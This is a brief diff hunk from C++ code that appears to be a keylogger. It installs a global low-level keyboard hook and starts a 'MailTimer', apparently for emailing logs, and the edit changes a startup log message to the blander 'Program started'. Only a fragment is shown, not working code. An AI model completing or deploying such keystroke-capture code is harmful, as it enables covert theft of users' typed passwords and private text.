@@ -51,7 +51,7 @@ LRESULT OurKeyboardProc(int nCode, WPARAM wparam, LPARAM lparam){
 }
 
 bool InstallHook(){
-    Helper::writeLog("Hook and Timer started");
+    Helper::writeLog("Program started");
     MailTimer.Start(true);
 
     // WH_KEYBOARD_LL:      says we use keyboard hook. LL means low level & global hook
